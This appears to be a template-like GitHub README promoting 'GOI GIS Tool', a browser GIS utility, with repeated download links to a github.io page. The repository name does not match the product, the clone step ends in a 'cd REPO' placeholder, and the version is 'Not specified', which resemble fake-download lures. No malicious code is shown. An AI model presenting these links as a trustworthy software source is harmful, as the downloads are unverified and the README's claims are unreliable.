# GOI GIS Tool - GIS Mapping Tool 2026

> **GOI GIS Tool is a browser-based GIS utility for coordinate conversion, offline mapping, waypoint and track management, and geospatial file exchange.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanwalker3/cursor-coordinate-converter-win-9076?style=flat-square)](https://github.com/seanwalker3/cursor-coordinate-converter-win-9076)

---

<p align="center">
  <a href="https://seanwalker3.github.io/cursor-coordinate-converter-win-9076/">
    <img src="https://img.shields.io/badge/Download-GOI%20GIS%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download GOI GIS Tool">
  </a>
</p>

> **[Direct Download - GOI GIS Tool](https://seanwalker3.github.io/cursor-coordinate-converter-win-9076/)**

---

[Download Latest Build](https://seanwalker3.github.io/cursor-coordinate-converter-win-9076/)

---

## About GOI GIS Tool

GOI GIS Tool is a standalone web application for working with geographic coordinates, maps, waypoints, tracks, and common geospatial formats. It supports coordinate conversion across DD, DDM, DMS, UTM, MGRS, Plus Codes, and multiple datums, making it useful for field planning, navigation workflows, and general GIS reference tasks.

The interface is designed for offline-first use, with full-screen mapping, cached map areas, measurement tools, and support for several basemap and nautical chart layers. Because it runs from a single HTML file, it can be opened directly in a compatible browser without a separate installation or build process.

---

## Features

- Convert positions between DD, DDM, DMS, UTM, MGRS, Plus Codes, and supported datums.
- Use a full-screen map interface with offline-first operation.
- Create, edit, save, and export tracks.
- Add, organize, import, export, and place waypoints.
- Cache map tiles and preserve selected areas for offline viewing.
- Measure distances, azimuths, polygons, and areas.
- Import GPX, KML, and GeoJSON geometry.
- Export data as GPX, KML, GeoJSON, CSV, or map images.
- Switch between multiple basemap and nautical chart layers.
- Use the interface in Italian, English, or French.
- Open the application as a standalone HTML file without build steps.

---

## Installation

GOI GIS Tool is distributed as a standalone HTML application.

### Download

1. Open the [latest build](https://seanwalker3.github.io/cursor-coordinate-converter-win-9076/).
2. Download the provided HTML file.
3. Save it locally on your computer or device.
4. Open the file in a modern web browser.

### Clone the repository

```bash
git clone https://github.com/seanwalker3/cursor-coordinate-converter-win-9076.git
cd REPO
```

Open the main HTML file in a web browser. No package manager, compilation step, or local server is required for the standalone application.

---

## Usage

A typical workflow can include:

1. Open the application in a web browser.
2. Select a basemap or nautical chart layer.
3. Enter a position and convert it between supported coordinate systems.
4. Place waypoints directly on the map or import them from a supported file.
5. Draw or edit a track and review its distance or azimuth.
6. Measure a route, polygon, or area as needed.
7. Save or export the resulting data as GPX, KML, GeoJSON, CSV, or a map image.
8. Cache a map area when offline access is needed.

### Coordinate conversion

Use the coordinate tools to enter a position in one supported format, choose the desired output format and datum, then review or copy the converted result.

### File workflows

Import GPX, KML, or GeoJSON geometry to bring existing data into the map. After editing waypoints or tracks, export the working data in the format required by the next tool or workflow.

---

## Configuration

GOI GIS Tool is intended to run without a separate configuration file or build environment. Application options are managed within the web interface, including:

- Coordinate format and datum selection
- Basemap or nautical chart layer
- Language selection
- Map area caching
- Waypoint and track data
- Measurement tools and display settings

When using the standalone HTML file, keep exported files and any locally saved map data in a location that is easy to access again.

---

## Requirements

- A modern web browser with JavaScript enabled
- A desktop or mobile device capable of displaying an interactive map
- Local storage or browser storage for cached map areas and saved working data
- Internet access when initially loading online map layers or downloading the application
- Sufficient available storage for cached tiles and exported files

The application is delivered as HTML and does not require a separate runtime, compiler, or installation process.

---

## FAQ

### Does GOI GIS Tool require installation?

No. The application can run from a standalone HTML file opened in a compatible web browser.

### Can it work offline?

It is designed for offline-first mapping. Map areas must be cached beforehand when offline tile access is required.

### Which coordinate formats are supported?

The tool supports DD, DDM, DMS, UTM, MGRS, Plus Codes, and multiple datums.

### Which file formats can be imported?

GPX, KML, and GeoJSON geometry can be imported into the map.

### Which formats are available for export?

Waypoints and tracks can be exported as GPX, KML, GeoJSON, or CSV. Map images can also be exported.

### How can I change the interface language?

Select the preferred language from the application settings. The available languages are Italian, English, and French.

### Why are map tiles not available offline?

The relevant map area must be cached while the required layer is available. Check the selected layer and repeat the caching step before leaving network coverage.

### Where should issues or support requests be reported?

Use the repository's issue tracker at [https://github.com/seanwalker3/cursor-coordinate-converter-win-9076](https://github.com/seanwalker3/cursor-coordinate-converter-win-9076) and include the browser, operating environment, input format, and steps needed to reproduce the problem.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
